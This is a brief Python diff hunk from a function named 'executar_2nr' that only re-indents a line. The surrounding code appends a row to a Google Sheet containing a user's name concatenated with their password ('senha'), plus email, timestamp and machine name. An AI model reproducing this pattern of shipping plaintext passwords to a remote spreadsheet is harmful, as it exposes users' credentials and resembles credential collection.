@@ -5484,7 +5484,7 @@ def executar_2nr():
                             sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
                             values = sheet.col_values(1)
                             last_row = len(values)
-                        values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
+                            values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app]
                             cell_list = sheet.range(f'A{last_row+1}:E{last_row+1}')
                             for i, val in enumerate(values):
                                 cell_list[i].value = val
